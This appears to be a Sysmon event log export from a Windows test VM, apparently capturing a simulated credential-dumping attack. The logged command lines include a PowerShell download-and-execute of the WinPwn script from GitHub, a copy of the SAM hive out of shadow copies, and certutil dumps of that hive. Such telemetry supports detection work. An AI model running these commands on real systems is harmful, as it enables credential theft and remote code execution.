Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19561,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-4769-658c-b201-000000000f00},3588,5980,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:48:57.8071303Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:48:57.806,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:48:57.8071303Z""/>
      
            
      <EventRecordID>19561</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:48:57.806</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4769-658c-b201-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">5980</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 15:48:56.598,,,,,,,,11,19560,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-4768-658c-b001-000000000f00},3588,10504,,,,,,-,,,,,,2023-12-27T15:48:56.6028282Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_x3vawf4l.ozn.ps1,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:48:56.598,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:48:56.6028282Z""/>
      
            
      <EventRecordID>19560</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:48:56.598</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4768-658c-b001-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10504</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_x3vawf4l.ozn.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 15:48:56.598</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {1..10 | %% { 
 try { [System.IO.File]::Copy(\""""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM\"""" , \""""$env:TEMP\SAMvss$_\"""", \""""true\"""") } catch {}
 ls \""""$env:TEMP\SAMvss$_\"""" -ErrorAction Ignore
}}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19559,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-4768-658c-b001-000000000f00},3588,10504,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:48:56.4958431Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:48:56.494,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:48:56.4958431Z""/>
      
            
      <EventRecordID>19559</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:48:56.494</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4768-658c-b001-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10504</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {1..10 | %% { 
 try { [System.IO.File]::Copy(\""""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM\"""" , \""""$env:TEMP\SAMvss$_\"""", \""""true\"""") } catch {}
 ls \""""$env:TEMP\SAMvss$_\"""" -ErrorAction Ignore
}}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss10 2 ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,CertUtil.exe,,,,,,1,19558,10.0.22621.2506 (WinBuild.160101.0800),"MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902",C:\Windows\System32\certutil.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,CertUtil.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*",C:\Windows\System32\cmd.exe,{f57bd86a-4767-658c-a401-000000000f00},3636,WINDEV2309EVAL\User,{f57bd86a-4768-658c-af01-000000000f00},3588,8876,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:48:56.2807504Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:48:56.279,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:48:56.2807504Z""/>
      
            
      <EventRecordID>19558</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:48:56.279</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4768-658c-af01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">8876</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\certutil.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">CertUtil.exe</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">CertUtil.exe</Data>
      
            
      <Data Name=""CommandLine"">certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss10 2 </Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-4767-658c-a401-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">3636</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy9\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss9 2 ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,CertUtil.exe,,,,,,1,19557,10.0.22621.2506 (WinBuild.160101.0800),"MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902",C:\Windows\System32\certutil.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,CertUtil.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*",C:\Windows\System32\cmd.exe,{f57bd86a-4767-658c-a401-000000000f00},3636,WINDEV2309EVAL\User,{f57bd86a-4768-658c-ae01-000000000f00},3588,10524,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:48:56.2467157Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:48:56.245,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:48:56.2467157Z""/>
      
            
      <EventRecordID>19557</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:48:56.245</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4768-658c-ae01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10524</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\certutil.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">CertUtil.exe</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">CertUtil.exe</Data>
      
            
      <Data Name=""CommandLine"">certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy9\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss9 2 </Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-4767-658c-a401-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">3636</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss8 2 ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,CertUtil.exe,,,,,,1,19556,10.0.22621.2506 (WinBuild.160101.0800),"MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902",C:\Windows\System32\certutil.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,CertUtil.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*",C:\Windows\System32\cmd.exe,{f57bd86a-4767-658c-a401-000000000f00},3636,WINDEV2309EVAL\User,{f57bd86a-4768-658c-ad01-000000000f00},3588,6772,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:48:56.2140961Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:48:56.213,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:48:56.2140961Z""/>
      
            
      <EventRecordID>19556</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:48:56.213</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4768-658c-ad01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">6772</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\certutil.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">CertUtil.exe</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">CertUtil.exe</Data>
      
            
      <Data Name=""CommandLine"">certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss8 2 </Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-4767-658c-a401-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">3636</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss7 2 ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,CertUtil.exe,,,,,,1,19555,10.0.22621.2506 (WinBuild.160101.0800),"MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902",C:\Windows\System32\certutil.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,CertUtil.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*",C:\Windows\System32\cmd.exe,{f57bd86a-4767-658c-a401-000000000f00},3636,WINDEV2309EVAL\User,{f57bd86a-4768-658c-ac01-000000000f00},3588,10852,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:48:56.1807008Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:48:56.179,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:48:56.1807008Z""/>
      
            
      <EventRecordID>19555</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:48:56.179</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4768-658c-ac01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10852</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\certutil.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">CertUtil.exe</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">CertUtil.exe</Data>
      
            
      <Data Name=""CommandLine"">certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss7 2 </Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-4767-658c-a401-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">3636</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
